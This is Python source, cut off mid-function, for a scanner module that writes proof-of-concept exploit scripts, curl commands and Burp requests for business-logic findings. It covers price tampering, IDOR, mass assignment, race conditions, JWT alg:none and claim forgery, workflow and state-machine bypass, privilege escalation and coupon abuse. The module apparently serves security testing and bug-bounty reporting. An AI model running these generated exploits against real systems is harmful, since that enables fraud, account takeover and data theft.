"""
BLFinder v2.1 — Proof of Concept Generator

Produces ready-to-run reproduction artifacts for each finding.
Every PoC includes:
  - curl command
  - Standalone Python script
  - Raw HTTP (Burp Repeater format)
  - Step-by-step manual reproduction guide
"""

import json
import re
import shlex
from urllib.parse import urlparse
from .models import Finding, ProofOfConcept, ScanConfig


class PoCGenerator:

    def __init__(self, config: ScanConfig):
        self.config = config

    def generate(self, finding: Finding) -> ProofOfConcept:
        """Route to the right PoC builder based on category."""
        cat = finding.category.lower()

        if "price" in cat or "negative" in cat:
            return self._poc_price_manipulation(finding)
        elif "idor" in cat or "bola" in cat:
            return self._poc_idor(finding)
        elif "cross-object" in cat or "cross object" in cat:
            return self._poc_cross_object_confusion(finding)
        elif "mass assignment" in cat:
            return self._poc_mass_assignment(finding)
        elif "race" in cat:
            return self._poc_race_condition(finding)
        elif "jwt" in cat:
            return self._poc_jwt(finding)
        elif "workflow" in cat:
            return self._poc_workflow_bypass(finding)
        elif "state machine" in cat and finding.cwe == "CWE-841":
            return self._poc_state_transition_abuse(finding)
        elif "state machine" in cat:
            return self._poc_state_machine(finding)
        elif "bfla" in cat or "function level" in cat or "privilege" in cat:
            return self._poc_privilege_escalation(finding)
        elif "coupon" in cat:
            return self._poc_coupon(finding)
        elif "graphql" in cat:
            return self._poc_graphql(finding)
        elif "enumeration" in cat:
            return self._poc_enumeration(finding)
        elif "bopla" in cat or "property" in cat:
            return self._poc_bopla(finding)
        else:
            return self._poc_generic(finding)



    def _auth_header(self, token: str = None) -> str:
        t = token or self.config.auth_token
        return f'-H "Authorization: Bearer {t}"' if t else ""

    def _curl_base(self, method: str, url: str, body: dict = None,
                   extra_headers: dict = None, token: str = None) -> str:
        parts = ["curl -sk"]
        parts.append(f"-X {method}")
        parts.append(f'"{url}"')
        parts.append('-H "Content-Type: application/json"')
        auth = self._auth_header(token)
        if auth:
            parts.append(auth)
        if extra_headers:
            for k, v in extra_headers.items():
                parts.append(f'-H "{k}: {v}"')
        if body:
            body_str = json.dumps(body)
            parts.append(f"-d '{body_str}'")
        return " \\\n  ".join(parts)

    def _burp_request(self, method: str, url: str, body: dict = None,
                      extra_headers: dict = None, token: str = None) -> str:
        parsed = urlparse(url)
        path = parsed.path + (f"?{parsed.query}" if parsed.query else "")
        host = parsed.netloc

        lines = [f"{method} {path} HTTP/1.1"]
        lines.append(f"Host: {host}")
        lines.append("Content-Type: application/json")
        lines.append("Accept: application/json")
        if token or self.config.auth_token:
            t = token or self.config.auth_token
            lines.append(f"Authorization: Bearer {t}")
        if extra_headers:
            for k, v in extra_headers.items():
                lines.append(f"{k}: {v}")
        body_str = json.dumps(body, indent=2) if body else ""
        if body_str:
            lines.append(f"Content-Length: {len(body_str)}")
        lines.append("")
        if body_str:
            lines.append(body_str)
        return "\n".join(lines)

    def _python_script_header(self) -> str:
        return '''#!/usr/bin/env python3
"""
BLFinder v2.1 — Auto-generated PoC
Run: pip install requests && python3 this_poc.py
"""
import requests
import json

session = requests.Session()
session.verify = False
'''



    def _poc_price_manipulation(self, f: Finding) -> ProofOfConcept:
        req = f.request
        url = req.get("url", "")
        method = req.get("method", "POST")
        body = req.get("body", {})
        token = self.config.auth_token

        python = self._python_script_header() + f'''
TARGET = "{url}"
HEADERS = {{
    "Authorization": "Bearer {token}",
    "Content-Type": "application/json",
}}

# Step 1: Baseline — normal purchase
normal_body = {json.dumps({k: v for k, v in body.items()}, indent=4)}
r1 = session.request("{method}", TARGET, json=normal_body, headers=HEADERS)
print(f"[BASELINE] Status: {{r1.status_code}}")
print(f"[BASELINE] Body: {{r1.text[:300]}}")

# Step 2: Tampered — manipulated price/quantity
tampered_body = {json.dumps(body, indent=4)}
r2 = session.request("{method}", TARGET, json=tampered_body, headers=HEADERS)
print(f"\\n[TAMPERED] Status: {{r2.status_code}}")
print(f"[TAMPERED] Body: {{r2.text[:500]}}")

if r2.status_code in (200, 201):
    print("\\n[!] VULNERABILITY CONFIRMED — tampered value accepted")
    print("[!] Compare order values in both responses above")
else:
    print("\\n[-] Tampered request rejected")
'''

        steps = [
            f"1. Authenticate and obtain a valid session/token for the application",
            f"2. Add a product to cart or initiate a purchase flow normally",
            f"3. Intercept the {method} request to {url} using Burp Suite",
            f"4. Modify the price/amount field to the tampered value shown in Evidence",
            f"5. Forward the modified request",
            f"6. Observe that the server accepts the manipulated price and processes the order",
            f"7. Check the order confirmation — it should reflect the tampered price",
        ]

        return ProofOfConcept(
            summary=f"Tampered price field accepted — order processed at attacker-controlled price",
            curl_command=self._curl_base(method, url, body),
            python_script=python,
            burp_request=self._burp_request(method, url, body),
            expected_result="Server returns HTTP 200/201 and creates an order at the manipulated price. Compare `total` or `amount` in the response to the submitted value.",
            steps=steps,
            video_note="Record two full purchases: one normal, one with tampered price. Show the order confirmation emails/receipts if possible.",
        )

    def _poc_idor(self, f: Finding) -> ProofOfConcept:
        req = f.request
        url = req.get("url", "")
        method = req.get("method", "GET")
        body = req.get("body", {})
        token1 = self.config.auth_token
        token2 = self.config.second_user_token

        two_user_section = ""
        if token2:
            two_user_section = f'''
# Step 3: Access User 1's resource using User 2's token
HEADERS_USER2 = {{
    "Authorization": "Bearer {token2}",
    "Content-Type": "application/json",
}}
r3 = session.request("{method}", TARGET, headers=HEADERS_USER2)
print(f"\\n[USER2 ACCESS USER1 RESOURCE] Status: {{r3.status_code}}")
print(f"[USER2 RESPONSE] Body: {{r3.text[:500]}}")

if r3.status_code == 200:
    print("\\n[!!!] IDOR FULLY CONFIRMED — User 2 can access User 1 resource")
    # Compare data to confirm it's really User 1's data
    if r1.text.strip() == r3.text.strip():
        print("[!!!] Responses match — same object returned to both users")
'''

        python = self._python_script_header() + f'''
# IDOR/BOLA PoC
# Requires two accounts: User 1 (resource owner) and User 2 (attacker)

TARGET = "{url}"

# Step 1: User 1 accesses their own resource (baseline)
HEADERS_USER1 = {{
    "Authorization": "Bearer {token1}",
    "Content-Type": "application/json",
}}
r1 = session.request("{method}", TARGET, headers=HEADERS_USER1)
print(f"[USER1 OWN RESOURCE] Status: {{r1.status_code}}")
print(f"[USER1 RESPONSE] Body: {{r1.text[:300]}}")

# Step 2: Access a neighbouring resource ID (IDOR attempt)
tampered_url = "{url}"  # URL with ID replaced as shown in Evidence
r2 = session.request("{method}", tampered_url, headers=HEADERS_USER1)
print(f"\\n[IDOR ATTEMPT] Status: {{r2.status_code}}")
print(f"[IDOR RESPONSE] Body: {{r2.text[:500]}}")

if r2.status_code == 200 and r1.text != r2.text:
    print("\\n[!] Different resource returned — potential IDOR")
{two_user_section}
'''

        steps = [
            "1. Create or use two separate accounts: Account A (victim) and Account B (attacker)",
            "2. With Account A, create a resource (order, profile, document, etc.) and note its ID",
            f"3. With Account B's token, send: {method} {url}",
            "4. Observe that the server returns Account A's resource data to Account B",
            "5. Modify the ID by ±1 and repeat — enumerate adjacent resources",
            "6. Document that Account B can read/modify/delete Account A's data without authorization",
        ]

        curl_user2 = ""
        if token2:
            curl_user2 = f"\n\n# Step 2: Access with User 2's token (cross-user confirmation)\n" + \
                         self._curl_base(method, url, body, token=token2)

        return ProofOfConcept(
            summary=f"User can access another user's resource by changing the ID in the request",
            curl_command=self._curl_base(method, url, body) + curl_user2,
            python_script=python,
            burp_request=self._burp_request(method, url, body),
            expected_result="HTTP 200 returned with another user's data. Response should contain PII, order details, or other sensitive data belonging to a different account.",
            steps=steps,
            video_note="Show two browser windows logged in as different accounts. Demonstrate that Account B's request returns Account A's data.",
        )

    def _poc_mass_assignment(self, f: Finding) -> ProofOfConcept:
        req = f.request
        url = req.get("url", "")
        method = req.get("method", "POST")
        body = req.get("body", {})
        token = self.config.auth_token

        python = self._python_script_header() + f'''
# Mass Assignment PoC
TARGET = "{url}"
HEADERS = {{
    "Authorization": "Bearer {token}",
    "Content-Type": "application/json",
}}

# Step 1: Normal request (baseline)
normal_body = {json.dumps({k: v for k, v in body.items() if k not in ["is_admin", "admin", "role", "premium"]}, indent=4)}
r1 = session.request("{method}", TARGET, json=normal_body, headers=HEADERS)
print(f"[BASELINE] Status: {{r1.status_code}}")
print(f"[BASELINE] Your role/permissions: {{r1.text[:300]}}")

# Step 2: Injected privileged fields
privileged_body = {json.dumps(body, indent=4)}
r2 = session.request("{method}", TARGET, json=privileged_body, headers=HEADERS)
print(f"\\n[MASS ASSIGNMENT] Status: {{r2.status_code}}")
print(f"[MASS ASSIGNMENT] Response: {{r2.text[:500]}}")

# Check if the privileged field was accepted and reflected
import json as _json
try:
    resp_data = _json.loads(r2.text)
    for field in ["is_admin", "admin", "role", "premium", "is_premium", "verified"]:
        if field in resp_data:
            print(f"\\n[!!!] Field `{{field}}` = {{resp_data[field]}} reflected in response!")
            print("[!!!] MASS ASSIGNMENT CONFIRMED")
except Exception:
    pass
'''

        steps = [
            "1. Register/login as a normal unprivileged user",
            f"2. Intercept a {method} request to {url}",
            "3. Add the privileged fields shown in the Evidence section to the request body",
            "4. Forward the request and inspect the response",
            "5. Look for the injected field reflected back with the privileged value",
            "6. Make a second request to a privileged endpoint (e.g. /api/admin) to confirm elevated access",
        ]

        return ProofOfConcept(
            summary="Privileged field accepted in request body and reflected — role/permissions can be self-escalated",
            curl_command=self._curl_base(method, url, body),
            python_script=python,
            burp_request=self._burp_request(method, url, body),
            expected_result="The injected field (e.g. `is_admin: true`) appears in the response with the attacker-supplied value. Subsequent requests to admin endpoints succeed.",
            steps=steps,
            video_note="Show the field in the request body, then show it reflected in the response. Then attempt to access an admin endpoint and show it succeeds.",
        )

    def _extract_race_evidence(self, f: Finding) -> dict:
        """
        Pull the real numbers the oracle found (winning concurrency,
        success/total ratio, distinct identifiers) out of the finding's
        title/evidence text, so the generated PoC actually reflects what
        was proven instead of a hardcoded "15 concurrent requests" guess.
        """
        text = f"{f.title} {f.evidence}"
        concurrency_match = re.search(r"concurrency=(\d+)", text)
        ratio_match        = re.search(r"(\d+)/(\d+)", text)
        ids_match          = re.search(r"DISTINCT resource identifiers[^(]*\(([^)]+)\)", text)
        cross_account       = "second account" in text.lower() or "different account" in text.lower()
        return {
            "concurrency": int(concurrency_match.group(1)) if concurrency_match else 15,
            "success":     int(ratio_match.group(1)) if ratio_match else None,
            "total":       int(ratio_match.group(2)) if ratio_match else None,
            "distinct_ids": [s.strip() for s in ids_match.group(1).split(",")] if ids_match else [],
            "cross_account": cross_account,
        }

    def _poc_race_condition(self, f: Finding) -> ProofOfConcept:
        req = f.request
        url = req.get("url", "")
        method = req.get("method", "POST")
        body = req.get("body", {})
        token = self.config.auth_token

        ev = self._extract_race_evidence(f)
        n = ev["concurrency"]
        oracle_note = (
            f"# The scanner's oracle already confirmed {len(ev['distinct_ids'])} DISTINCT "
            f"resource identifiers were created during the burst: {ev['distinct_ids']}\n"
            f"# — i.e. this is a proven double-processing bug, not a status-code guess."
            if ev["distinct_ids"] else
            "# NOTE: the scanner saw multiple HTTP successes but could not extract a\n"
            "# distinct resource identifier from the response body — re-confirm by\n"
            "# checking the actual backend state (balance/stock/order count) below."
        )

        python = self._python_script_header() + f'''
# Race Condition PoC — reproduces the exact burst the scanner used
# (connection-warmed, concurrency={n}) that already proved this finding.
import threading
import requests
import json

TARGET = "{url}"
HEADERS = {{
    "Authorization": "Bearer {token}",
    "Content-Type": "application/json",
}}
BODY = {json.dumps(body, indent=4)}
CONCURRENCY = {n}

{oracle_note}

results = []
lock = threading.Lock()

def warm_up():
    """Pre-open connections so the real burst below reuses established
    keep-alive sockets instead of paying a fresh TCP/TLS handshake per
    request — the same connection-warming technique the scanner uses."""
    for _ in range(CONCURRENCY):
        try:
            requests.options(TARGET, headers=HEADERS, verify=False, timeout=5)
        except Exception:
            pass

def send_request(idx):
    try:
        r = requests.request("{method}", TARGET, json=BODY, headers=HEADERS, verify=False, timeout=15)
        with lock:
            results.append((idx, r.status_code, r.text[:200]))
            print(f"  Thread {{idx}}: HTTP {{r.status_code}}")
    except Exception as e:
        with lock:
            results.append((idx, 0, str(e)))

print(f"[*] Warming {{CONCURRENCY}} connections...")
warm_up()
print(f"[*] Firing {{CONCURRENCY}} concurrent requests...")
threads = [threading.Thread(target=send_request, args=(i,)) for i in range(CONCURRENCY)]
for t in threads:
    t.start()
for t in threads:
    t.join()

successes = [r for r in results if r[1] in (200, 201)]
print(f"\\n[RESULT] {{len(successes)}}/{{CONCURRENCY}} requests succeeded")

# Pull out a resource/transaction identifier from each successful body if
# present, and count DISTINCT ones — that's what actually proves separate
# mutations were committed, rather than one transaction echoed back N times.
import re as _re
ids = set()
for _, status, body_preview in successes:
    for m in _re.finditer(r'"(?:id|transaction_id|order_id|reference)"\\s*:\\s*"?([\\w-]+)"?', body_preview):
        ids.add(m.group(1))

if len(ids) > 1:
    print(f"[!!!] RACE CONDITION CONFIRMED — {{len(ids)}} DISTINCT identifiers created: {{ids}}")
elif len(successes) > 1:
    print("[!] Multiple HTTP successes but identifiers matched/were not found —")
    print("[!] verify actual backend state (balance/stock) before reporting as Critical")
else:
    print("[-] Only 1 or fewer requests succeeded on this run — race windows can be timing-")
    print("[-] sensitive; the scanner already confirmed this once, try re-running a few times")
'''

        steps = [
            f"1. Identify the single-use resource at {url} (coupon, withdrawal, redemption, etc.)",
            f"2. Fire {n} near-simultaneous {method} requests with the same payload — warm connections first "
            "(OPTIONS/HEAD to the same host) to minimize TCP/TLS handshake jitter before the timed burst",
            f"3. Confirm more than 1 of {n} requests returned success",
            "4. Extract the resource identifier from each successful response and confirm they are DISTINCT "
            "(proves separate mutations, not one transaction echoed back)",
            "5. Cross-check actual backend state (balance/stock/order count) against what a single request should have produced",
        ]
        if ev["cross_account"]:
            steps.append(
                "6. Repeat the burst from a second account/session — the scanner found the same "
                "race succeeds cross-account, indicating any lock in place isn't even scoped per-account"
            )

        burp_note = (
            "# Burp Suite Turbo Intruder config:\n"
            "# 1. Send request to Turbo Intruder\n"
            "# 2. Use script: examples/race-single-packet.py\n"
            f"# 3. Set concurrentConnections=1, requestsPerConnection={n}\n"
            "# 4. Click Attack\n\n"
        ) + self._burp_request(method, url, body)

        distinct_note = (
            f" Confirmed via {len(ev['distinct_ids'])} distinct resource identifiers "
            f"({', '.join(ev['distinct_ids'][:5])})."
            if ev["distinct_ids"] else ""
        )

        return ProofOfConcept(
            summary=(
                f"{ev['success']}/{ev['total']} concurrent requests succeeded at concurrency={n}"
                f"{distinct_note}"
                if ev["success"] else
                "Multiple concurrent identical requests succeed — one-time operation executed multiple times"
            ),
            curl_command=(
                f"# Run this in bash to fire parallel requests (concurrency={n}, matching the scanner's finding):\n"
                f"for i in $(seq 1 {n}); do\n"
                f"  {self._curl_base(method, url, body)} &\n"
                f"done\nwait\necho 'Done'"
            ),
            python_script=python,
            burp_request=burp_note,
            expected_result=(
                f"More than 1 of the {n} concurrent requests returns HTTP 200/201, with DISTINCT resource "
                "identifiers across the successful responses — confirming the resource (coupon, credit, etc.) "
                "was consumed/created multiple times, not just that the HTTP layer said 200 twice."
            ),
            steps=steps,
            video_note="Use screen recording. Show the concurrent requests firing, then show the backend reflecting multiple successful, distinctly-identified redemptions.",
        )

    def _poc_jwt(self, f: Finding) -> ProofOfConcept:
        req = f.request
        url = req.get("url", "")
        method = req.get("method", "GET")
        body = req.get("body", {})
        token = self.config.auth_token

        alg_none = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"  

        python = self._python_script_header() + f'''
# JWT Vulnerability PoC
import base64
import json

def b64_encode(data: dict) -> str:
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()

def b64_decode(part: str) -> dict:
    pad = 4 - len(part) % 4
    return json.loads(base64.urlsafe_b64decode(part + "=" * pad))

TARGET = "{url}"
ORIGINAL_TOKEN = "{token}"

parts = ORIGINAL_TOKEN.split(".")
if len(parts) != 3:
    print("[!] Token is not a standard JWT")
    exit(1)

header = b64_decode(parts[0])
payload = b64_decode(parts[1])
print(f"[*] Original header: {{header}}")
print(f"[*] Original payload: {{payload}}")

# ── Test 1: alg:none bypass ───────────────────────────────────────────────────
header_none = {{**header, "alg": "none"}}
forged_none = f"{{b64_encode(header_none)}}.{{parts[1]}}."
r1 = requests.request(
    "{method}", TARGET,
    headers={{"Authorization": f"Bearer {{forged_none}}", "Content-Type": "application/json"}},
    verify=False
)
print(f"\\n[ALG:NONE] Status: {{r1.status_code}}")
print(f"[ALG:NONE] Response: {{r1.text[:300]}}")
if r1.status_code in (200, 201):
    print("[!!!] ALG:NONE BYPASS CONFIRMED — signatures are not verified!")

# ── Test 2: Claim escalation ──────────────────────────────────────────────────
for escalation in [{{"role": "admin"}}, {{"is_admin": True}}, {{"scope": "admin"}}]:
    forged_payload = {{**payload, **escalation}}
    forged_token = f"{{parts[0]}}.{{b64_encode(forged_payload)}}.fakesig"
    r2 = requests.request(
        "{method}", TARGET,
        headers={{"Authorization": f"Bearer {{forged_token}}", "Content-Type": "application/json"}},
        verify=False
    )
    print(f"\\n[CLAIM ESCALATION {{escalation}}] Status: {{r2.status_code}}")
    print(f"Response: {{r2.text[:200]}}")
    if r2.status_code in (200, 201):
        print(f"[!!!] CLAIM ESCALATION ACCEPTED with {{escalation}}")
        break
'''

        steps = [
            "1. Obtain a valid JWT token by logging in as a normal user",
            "2. Decode the JWT at jwt.io (paste and inspect — do NOT enter the secret)",
            "3. Modify the header's `alg` field to `none`",
            "4. Remove the signature (everything after the last dot) or set it to empty string",
            "5. Send the modified token in the Authorization header",
            "6. If accepted, the server does not validate JWT signatures",
            "7. Escalation test: modify payload claims (`role`, `is_admin`, etc.) with forged sig",
        ]

        return ProofOfConcept(
            summary="JWT signature validation bypassed — claims can be forged without knowing the secret",
            curl_command=(
                f"# Test alg:none bypass:\n"
                f"# 1. Take your token: {token[:30]}...\n"
                f"# 2. Forge: <base64({{alg:none}})>.<original_payload>.\n"
                f"curl -sk -X {method} \"{url}\" \\\n"
                f'  -H "Authorization: Bearer {alg_none}.{parts[1] if (parts := token.split(".")) and len(parts)==3 else "<payload>"}." \\\n'
                f'  -H "Content-Type: application/json"'
            ),
            python_script=python,
            burp_request=self._burp_request(method, url, body),
            expected_result="Server accepts the forged JWT and returns HTTP 200. Claims in the payload can be arbitrarily modified without knowing the signing secret.",
            steps=steps,
            video_note="Show the JWT decoded at jwt.io, then the forged request in Burp, then the successful response.",
        )

    def _poc_workflow_bypass(self, f: Finding) -> ProofOfConcept:
        req = f.request
        url = req.get("url", "")
        method = req.get("method", "POST")
        body = req.get("body", {})
        token = self.config.auth_token

        python = self._python_script_header() + f'''
# Workflow Bypass PoC
TARGET = "{url}"
HEADERS = {{
    "Authorization": "Bearer {token}",
    "Content-Type": "application/json",
}}

# Directly access the later step, skipping required intermediate steps
bypass_body = {json.dumps(body, indent=4)}

r = session.request("{method}", TARGET, json=bypass_body, headers=HEADERS)
print(f"[WORKFLOW BYPASS] Status: {{r.status_code}}")
print(f"[RESPONSE] {{r.text[:500]}}")

if r.status_code in (200, 201):
    print("\\n[!!!] WORKFLOW BYPASS CONFIRMED")
    print("[!!!] Accessed later step without completing required earlier steps")
'''

        steps = [
            "1. Start a multi-step workflow (e.g. checkout, KYC, password reset)",
            "2. Complete Step 1 (e.g. cart review) and note the URL pattern",
            "3. Without completing Step 2, directly navigate to the Step 3 or final URL",
            "4. Observe the server processes the final step without verifying prior steps",
            "5. For token omission: send the final-step request with the `step`/`otp`/`mfa_token` field removed",
        ]

        return ProofOfConcept(
            summary="Multi-step workflow can be bypassed by directly accessing later steps",
            curl_command=self._curl_base(method, url, body),
            python_script=python,
            burp_request=self._burp_request(method, url, body),
            expected_result="Server processes the final step (payment, account creation, etc.) without enforcing prior steps.",
            steps=steps,
            video_note="Show the normal workflow, then skip steps 2 and 3 and go directly to the final step. Show it completes successfully.",
        )

    def _poc_state_machine(self, f: Finding) -> ProofOfConcept:
        req = f.request
        url = req.get("url", "")
        method = req.get("method", "PUT")
        body = req.get("body", {})
        token = self.config.auth_token

        python = self._python_script_header() + f'''
# State Machine Abuse PoC
TARGET = "{url}"
HEADERS = {{
    "Authorization": "Bearer {token}",
    "Content-Type": "application/json",
}}

# Baseline — current state
r1 = session.request("GET", TARGET, headers=HEADERS)
print(f"[BASELINE] Current state: {{r1.text[:200]}}")

# Force state transition
forced_body = {json.dumps(body, indent=4)}
r2 = session.request("{method}", TARGET, json=forced_body, headers=HEADERS)
print(f"\\n[STATE FORCE] Status: {{r2.status_code}}")
print(f"[STATE FORCE] Response: {{r2.text[:400]}}")

try:
    import json as _json
    resp = _json.loads(r2.text)
    for state_key in ["status", "state", "order_status", "payment_status"]:
        if state_key in resp:
            print(f"\\n[RESULT] {{state_key}} = {{resp[state_key]}}")
            if resp[state_key] in ("completed", "paid", "approved", "verified"):
                print("[!!!] STATE MACHINE ABUSE CONFIRMED — forced to privileged state")
except Exception:
    pass
'''

        steps = [
            "1. Create a resource that has a workflow state (order, payment, verification)",
            "2. The resource should be in a non-final state (e.g. `pending`)",
            f"3. Send a {method} request to {url} with the state field forced to the target value",
            "4. Observe the server accepts the state without verifying the transition conditions",
            "5. Check if downstream effects apply (e.g. goods shipped, access granted, payment bypassed)",
        ]

        return ProofOfConcept(
            summary="Object state forced to privileged value without satisfying transition conditions",
            curl_command=self._curl_base(method, url, body),
            python_script=python,
            burp_request=self._burp_request(method, url, body),
            expected_result="The state field in the response reflects the forced value. Business logic that depends on this state (shipping, access, payment) proceeds as if conditions were met.",
            steps=steps,
            video_note="Show the object's initial state, send the forced request, show the state change in the response, then show downstream impact.",
        )

    def _poc_state_transition_abuse(self, f: Finding) -> ProofOfConcept:
        """
        PoC for the flow-based state-transition fuzzer (attack_state_transitions,
        CWE-841). Unlike _poc_state_machine (which forces a single field on one
        request), this finding's exploit is "complete the flow up to step A, then
        invoke step B directly" — a genuinely different reproduction narrative
        (multi-step, not single-request), so it needs its own template.
        """
        req = f.request
        url = req.get("url", "")
        method = req.get("method", "POST")
        body = req.get("body", {})
        token = self.config.auth_token

        python = self._python_script_header() + f'''
# State-Machine Transition Abuse PoC
# The scanner proved this by executing the flow up to an earlier/prior
# state, then invoking THIS step directly — a transition the intended
# workflow does not allow at that point (going backward, replaying a
# terminal action, or skipping ahead).
TARGET = "{url}"
HEADERS = {{
    "Authorization": "Bearer {token}",
    "Content-Type": "application/json",
}}
BODY = {json.dumps(body, indent=4)}

# 1. Run the legitimate flow up to the state described in the finding's
#    evidence (see "State after '<step>'" in the evidence text) — do NOT
#    complete the step that would naturally lead here.
# 2. Then invoke this step directly:
r = session.request("{method}", TARGET, json=BODY, headers=HEADERS)
print(f"[STATE TRANSITION] Status: {{r.status_code}}")
print(f"[RESPONSE] {{r.text[:500]}}")

if r.status_code in (200, 201):
    print("\\n[!!!] STATE MACHINE ABUSE CONFIRMED")
    print("[!!!] This transition succeeded from a state that should not permit it")
'''

        steps = [
            "1. Re-run the legitimate multi-step flow this endpoint belongs to, stopping "
            "at the state described in the finding's evidence ('State after ...')",
            f"2. From that state, invoke this step directly: {method} {url}",
            "3. Observe the server processes it (HTTP 200/201) despite the intended flow "
            "not permitting this transition at that point",
            "4. Confirm with a canary request (garbage body) that the endpoint isn't simply "
            "accepting everything — it should reject the canary but accept the real payload",
            "5. Check for real downstream impact (double refund, re-opened ticket, "
            "state reverted after a dependent action already happened, etc.)",
        ]

        return ProofOfConcept(
            summary=f.evidence[:200],
            curl_command=self._curl_base(method, url, body),
            python_script=python,
            burp_request=self._burp_request(method, url, body),
            expected_result=(
                "The transition succeeds even though it is reachable only by violating the "
                "intended state graph (a backward transition, a replay of a single-use action, "
                "or a forward skip) — see the finding evidence for the exact prior state."
            ),
            steps=steps,
            video_note="Show the flow reaching the prior state, then show this step still succeeding when it should be blocked.",
        )

    def _poc_cross_object_confusion(self, f: Finding) -> ProofOfConcept:
        """
        PoC for attack_cross_instance_confusion findings — a class the router
        previously had no dedicated builder for at all (it silently fell
        through to _poc_generic, which just replays one request and gives no
        explanation of the two-instance setup a hunter actually needs).
        """
        req = f.request
        url = req.get("url", "")
        method = req.get("method", "POST")
        body = req.get("body", {})
        token = self.config.auth_token

        python = self._python_script_header() + f'''
# Cross-Object State Confusion PoC
# The scanner ran TWO independent instances of this flow (optionally under
# two different accounts), then substituted an identifier extracted from
# instance B into instance A's in-progress flow at this step — and the
# server accepted it. This request already has that swapped identifier
# baked in from the scan; re-running it against a FRESH pair of instances
# is how you confirm it's reproducible, not a one-off race:
TARGET = "{url}"
HEADERS = {{
    "Authorization": "Bearer {token}",
    "Content-Type": "application/json",
}}
BODY = {json.dumps(body, indent=4)}

r = session.request("{method}", TARGET, json=BODY, headers=HEADERS)
print(f"[CROSS-OBJECT] Status: {{r.status_code}}")
print(f"[RESPONSE] {{r.text[:500]}}")

if r.status_code in (200, 201):
    print("\\n[!!!] CROSS-OBJECT STATE CONFUSION CONFIRMED")
    print("[!!!] An identifier from a SEPARATE flow instance was accepted here")
'''

        steps = [
            "1. Start TWO independent instances of this flow (e.g. two separate orders/carts, "
            "ideally under two different accounts) up to the step named in the finding evidence",
            "2. Note the identifier(s) each instance's step returns (order id, coupon id, "
            "session/cart token — see 'Swapped field(s)' in the evidence)",
            "3. Continue instance A's flow to this step, but substitute in the identifier(s) "
            "extracted from instance B",
            f"4. Send: {method} {url} with the swapped identifier(s) in the body — the request below "
            "already has this baked in from the scan",
            "5. Confirm it succeeds (HTTP 200/201) — proving the server never verified the "
            "identifier actually belonged to the account/session currently executing",
        ]

        return ProofOfConcept(
            summary=f.evidence[:200],
            curl_command=self._curl_base(method, url, body),
            python_script=python,
            burp_request=self._burp_request(method, url, body),
            expected_result=(
                "The step succeeds using an identifier that belongs to a completely separate "
                "flow instance/account — proving the server does not bind extracted identifiers "
                "to the session that created them."
            ),
            steps=steps,
            video_note="Show two accounts each starting the flow, then show account A's request succeeding with account B's swapped-in identifier.",
        )

    def _poc_privilege_escalation(self, f: Finding) -> ProofOfConcept:
        req = f.request
        url = req.get("url", "")
        token = self.config.auth_token
        token2 = self.config.second_user_token

        python = self._python_script_header() + f'''
# Privilege Escalation / BFLA PoC
TARGET = "{url}"

# Test 1: Low-privilege user accessing admin endpoint
HEADERS_LOW = {{
    "Authorization": "Bearer {token}",
    "Content-Type": "application/json",
}}
r1 = session.get(TARGET, headers=HEADERS_LOW)
print(f"[LOW-PRIV ACCESS] Status: {{r1.status_code}}")
print(f"Response: {{r1.text[:400]}}")

if r1.status_code == 200:
    print("[!!!] PRIVILEGE ESCALATION CONFIRMED — low-priv user can access admin endpoint")

# Test 2: No auth
r2 = session.get(TARGET)
print(f"\\n[NO-AUTH ACCESS] Status: {{r2.status_code}}")
if r2.status_code == 200:
    print("[!!!] UNAUTHENTICATED ACCESS CONFIRMED")
'''

        steps = [
            "1. Log in as a regular (non-admin) user and copy the token",
            f"2. Send a GET request to {url} using the regular user's token",
            "3. Observe the server returns HTTP 200 and admin data",
            "4. Repeat without any Authorization header to test unauthenticated access",
            "5. Document what sensitive data or admin functions are exposed",
        ]

        curl_noauth = f"\n\n# No-auth test:\ncurl -sk \"{url}\""
        return ProofOfConcept(
            summary="Admin/privileged endpoint accessible by low-privilege or unauthenticated user",
            curl_command=self._curl_base("GET", url) + curl_noauth,
            python_script=python,
            burp_request=self._burp_request("GET", url),
            expected_result="HTTP 200 returned with admin data using a low-privilege token or no token at all.",
            steps=steps,
            video_note="Show the low-privilege account's dashboard, then show the admin endpoint returning data with that account's token.",
        )

    def _poc_coupon(self, f: Finding) -> ProofOfConcept:
        req = f.request
        url = req.get("url", "")
        method = req.get("method", "POST")
        body = req.get("body", {})
        token = self.config.auth_token

        python = self._python_script_header() + f'''
# Coupon Abuse PoC
TARGET = "{url}"
HEADERS = {{
    "Authorization": "Bearer {token}",
    "Content-Type": "application/json",
}}

# Baseline: normal coupon application
normal_body = {json.dumps(body, indent=4)}
r1 = session.request("{method}", TARGET, json=normal_body, headers=HEADERS)
print(f"[BASELINE] Status: {{r1.status_code}}")
try:
    import json as _j
    data = _j.loads(r1.text)
    print(f"[BASELINE] Discount: {{data.get('discount', data.get('discount_amount', 'not found'))}}")
except Exception:
    print(f"[BASELINE] Body: {{r1.text[:200]}}")

# Abuse: send coupon as array (type confusion)
coupon_key = next((k for k in normal_body if "coupon" in k.lower() or "promo" in k.lower()), None)
if coupon_key:
    array_body = {{**normal_body, coupon_key: [normal_body[coupon_key], normal_body[coupon_key]]}}
    r2 = session.request("{method}", TARGET, json=array_body, headers=HEADERS)
    print(f"\\n[ARRAY COUPON] Status: {{r2.status_code}}")
    try:
        data2 = _j.loads(r2.text)
        print(f"[ARRAY COUPON] Discount: {{data2.get('discount', data2.get('discount_amount', 'not found'))}}")
    except Exception:
        print(f"[ARRAY COUPON] Body: {{r2.text[:200]}}")
    
    if r2.status_code in (200, 201):
        print("\\n[!] Array coupon accepted — check if discount is larger than baseline")
'''

        steps = [
            "1. Find a coupon or promo code that provides a known discount (e.g. 10% off)",
            f"2. Apply it normally via {method} {url} and note the discount amount",
            "3. Repeat with the coupon field as an array: `[\"CODE\", \"CODE\"]`",
            "4. Also try applying the same code twice in separate requests (replay)",
            "5. Check if the discount doubles or if the code can be used after it should have expired",
        ]

        return ProofOfConcept(
            summary="Coupon code can be stacked or type-confused to gain larger-than-intended discount",
            curl_command=self._curl_base(method, url, body),
            python_script=python,
            burp_request=self._burp_request(method, url, body),
            expected_result="The discount in the response is larger than the intended amount, or the coupon is accepted past its single-use limit.",
            steps=steps,
            video_note="Show two checkout flows side by side: normal application vs array/stacked application. Show the total amounts differ.",
        )

    def _poc_graphql(self, f: Finding) -> ProofOfConcept:
        url = f.request.get("url", "")
        token = self.config.auth_token

        python = self._python_script_header() + f'''
# GraphQL Security PoC
TARGET = "{url}"

